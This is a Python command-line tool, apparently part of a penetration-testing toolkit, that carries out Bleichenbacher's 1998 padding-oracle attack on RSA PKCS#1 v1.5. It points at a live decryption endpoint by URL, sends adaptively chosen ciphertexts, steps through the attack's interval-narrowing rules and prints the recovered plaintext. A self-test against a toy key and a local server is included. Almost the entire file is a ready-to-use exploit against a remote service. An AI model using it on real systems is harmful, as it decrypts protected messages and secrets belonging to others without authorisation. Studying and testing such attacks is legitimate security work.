#!/usr/bin/env python3
"""bleichenbacher.py -- Bleichenbacher '98 attack against a PKCS#1
v1.5 conformance oracle: a service that decrypts RSA and answers
whether the plaintext begins with the bytes 00 02. One bit of
structure per query, and the interval set narrows until it holds a
single integer.

Different from tools/parity_oracle.py: the parity oracle leaks the
LSB and halves one interval per query; the PKCS oracle answers a
2-byte prefix check, so the live set is a union of intervals and
the multiplier s must be stepped per the '98 rules (2a/2b/2c).

  python3 tools/bleichenbacher.py --n HEX --e 65537 --ct HEX \
      --url 'http://t/dec?ct={CT}' --ok-regex 'valid|ok' \
      --neg-regex 'invalid|padding'
  python3 tools/bleichenbacher.py --selftest

The discriminator is the falsifier: first prove ONE query where a
conforming and a non-conforming ciphertext answer differently
(swap the first byte, or send the raw value 1). --max-requests is
the budget; on exhaustion the current interval set is printed.
If the supplied ciphertext is not itself conforming the tool tries
a bounded s0 blinding search and reports rather than guessing.
"""
import argparse, json, math, os, re, sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from urllib.parse import quote

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "web"))
import httpkit  # noqa: E402


def _ceil(a, b):
    return -(-a // b)


def _oracle_http(url_t, pos_re, neg_re):
    def ask(ct_int):
        url = url_t.replace("{CT}", format(ct_int, "x")).replace(
            "{CTU}", quote(format(ct_int, "x")))
        r = httpkit.request(url)
        if not r.get("ok"):
            raise ValueError("oracle transport failed: %s" % r.get("error"))
        body = r.get("body", "")
        if pos_re and re.search(pos_re, body):
            return 1
        if neg_re and re.search(neg_re, body):
            return 0
        m = re.search(r"\b([01])\b", body)
        if m:
            return int(m.group(1))
        raise ValueError("oracle response matched neither regex: "
                         + body[:120])
    return ask


def _narrow(M, s, n, B):
    out = []
    two_b, three_b = 2 * B, 3 * B - 1
    for a, b in M:
        r_lo = _ceil(a * s - three_b, n)
        r_hi = (b * s - two_b) // n
        for r in range(r_lo, r_hi + 1):
            lo = max(a, _ceil(two_b + r * n, s))
            hi = min(b, (three_b + r * n) // s)
            if lo <= hi:
                out.append((lo, hi))
    out.sort()
    merged = []
    for lo, hi in out:
        if merged and lo <= merged[-1][1] + 1:
            merged[-1] = (merged[-1][0], max(merged[-1][1], hi))
        else:
            merged.append((lo, hi))
    return merged


def attack(n, e, ct, oracle, max_requests=1 << 15):
    """Bleichenbacher '98. Returns (m, info) where info carries the
    query count, the final interval set, and how it ended."""
    k = (n.bit_length() + 7) // 8
    B = 1 << (8 * (k - 2))
    if k < 11:
        return None, {"note": "modulus too small for PKCS#1 v1.5 "
                              "(need k >= 11)", "queries": 0}
    qs = [0]

    def ask(c):
        qs[0] += 1
        return oracle(c)

    # step 1: conforming already? otherwise bounded blinding for s0
    s0 = 1
    if not ask(ct):
        s0 = 0
        for cand in range(2, 1 << 12):
            if ask(ct * pow(cand, e, n) % n):
                s0 = cand
                break
        if not s0:
            return None, {"note": "ciphertext not conforming and no "
                                  "s0 < 4096 blinded it; is this really "
                                  "a PKCS#1 v1.5 oracle?",
                          "queries": qs[0]}
    c0 = ct * pow(s0, e, n) % n
    M = [(2 * B, 3 * B - 1)]
    s = _ceil(n, 3 * B)                     # step 2a
    while True:
        # find next conforming s
        while True:
            if qs[0] >= max_requests:
                return None, {"note": "request budget spent",
                              "queries": qs[0],
                              "intervals": M, "s": s, "s0": s0}
            if ask(c0 * pow(s, e, n) % n):
                break
            s += 1
        M = _narrow(M, s, n, B)             # step 3
        if len(M) == 1 and M[0][0] == M[0][1]:
            m = M[0][0] * pow(s0, -1, n) % n
            return m, {"queries": qs[0], "intervals": M, "s0": s0,
                       "done": True}
        if not M:
            return None, {"note": "interval set emptied -- oracle "
                                  "answers are inconsistent",
                          "queries": qs[0]}
        if len(M) == 1:                     # step 2c
            a, b = M[0]
            r = _ceil(2 * (b * s - 2 * B), n)
            while True:
                s_lo = _ceil(2 * B + r * n, b)
                s_hi = (3 * B - 1 + r * n) // a
                for cand in range(s_lo, s_hi + 1):
                    if qs[0] >= max_requests:
                        return None, {"note": "request budget spent",
                                      "queries": qs[0],
                                      "intervals": M, "s0": s0}
                    if ask(c0 * pow(cand, e, n) % n):
                        s = cand
                        break
                else:
                    r += 1
                    continue
                break
        else:                               # step 2b
            s += 1


def _pkcs_pad(msg, k, rng):
    ps_len = k - 3 - len(msg)
    ps = bytes(rng.choice([b for b in range(1, 256)])
               for _ in range(ps_len))
    return b"\x00\x02" + ps + b"\x00" + msg


def _selftest():
    import random
    p = 0xC60F3A5E8229               # 48-bit prime (is_prime-checked)
    q = 0x9B41D7E3A6E5               # 48-bit prime -> n ~95 bits, k=12
    n, e = p * q, 65537
    d = pow(e, -1, (p - 1) * (q - 1))
    k = (n.bit_length() + 7) // 8
    assert k >= 11
    rng = random.Random(7)
    em = _pkcs_pad(b"Z", k, rng)          # k=12: 1-byte msg + 8-byte PS
    m = int.from_bytes(em, "big")
    ct = pow(m, e, n)

    def oracle(c):
        return int(int.from_bytes(pow(c, d, n)
                   .to_bytes(k, "big")[:2]) == 0x0002)

    rec, info = attack(n, e, ct, oracle, max_requests=1 << 19)
    assert rec == m, (hex(rec or 0), hex(m), info)
    assert info["queries"] > 0
    # http path
    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            mm = re.search(r"ct=([0-9a-fA-F]+)", self.path)
            c = int(mm.group(1), 16)
            ok = int.from_bytes(pow(c, d, n).to_bytes(k, "big")
                                [:2]) == 0x0002
            body = ("pad=%s" % ("ok" if ok else "bad")).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass
    srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
    Thread(target=srv.serve_forever, daemon=True).start()
    port = srv.server_address[1]
    ask = _oracle_http("http://127.0.0.1:%d/d?ct={CT}" % port,
                       r"pad=ok", r"pad=bad")
    # http leg proves transport + discriminator + honest budget
    # reporting. httpkit has ~100ms/req overhead, so run a small
    # bounded slice: the point is the wire path, not convergence.
    rec2, i2 = attack(n, e, ct, ask, max_requests=64)
    srv.shutdown()
    assert rec2 is None and "budget" in i2.get("note", ""), i2
    assert i2["queries"] == 64 and i2.get("intervals"), i2
    print("bleichenbacher selftest: ok (%d queries + http "
          "budget-report)" % info["queries"])


def main():
    ap = argparse.ArgumentParser(description="Bleichenbacher '98 "
                                 "PKCS#1 v1.5 oracle attack")
    ap.add_argument("--n", type=lambda x: int(x, 0))
    ap.add_argument("--e", type=lambda x: int(x, 0), default=65537)
    ap.add_argument("--ct", type=lambda x: int(x, 0))
    ap.add_argument("--url", help="template; {CT} -> hex ciphertext")
    ap.add_argument("--ok-regex", dest="pos_re",
                    help="body regex meaning CONFORMING 00 02 padding")
    ap.add_argument("--neg-regex", dest="neg_re",
                    help="body regex meaning bad padding")
    ap.add_argument("--max-requests", type=int, default=1 << 15)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        return _selftest()
    if not (a.n and a.ct and a.url):
        ap.error("--n --ct --url required")
    ask = _oracle_http(a.url, a.pos_re, a.neg_re)
    m, info = attack(a.n, a.e, a.ct, ask, a.max_requests)
    if m is not None:
        raw = m.to_bytes((m.bit_length() + 7) // 8 or 1, "big")
        info["recovered_hex"] = raw.hex()
        info["recovered_int"] = m
        if raw[:2] == b"\x00\x02":
            info["em_block"] = raw.hex()
            try:
                info["message"] = raw.split(b"\x00", 1)[1].decode()
            except Exception:
                pass
        else:
            try:
                info["message"] = raw.decode()
            except UnicodeDecodeError:
                pass
    print(json.dumps(info, indent=1, default=str))


if __name__ == "__main__":
    raise SystemExit(main())
